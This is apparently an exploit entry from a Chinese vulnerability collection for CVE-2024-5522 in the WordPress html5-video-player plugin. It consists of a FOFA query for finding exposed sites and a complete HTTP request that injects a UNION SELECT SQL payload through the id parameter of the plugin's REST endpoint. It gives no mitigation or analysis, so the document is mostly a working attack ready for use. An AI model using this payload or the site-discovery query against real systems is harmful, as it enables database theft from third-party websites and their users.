# 编号
CVE-2024-5522
# 空间测绘语句
fofa:"wordpress" && body="html5-video-player"
# POC

```text
GET /wp-json/h5vp/v1/video/0?id=%27+union%20all%20select%20concat(0x64617461626173653a,1,0x7c76657273696f6e3a,2,0x7c757365723a,md5(123)),2,3,4,5,6,7,8--%20- HTTP/1.1
Host: 
Sec-Ch-Ua: "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Priority: u=0, i
Connection: keep-alive

```

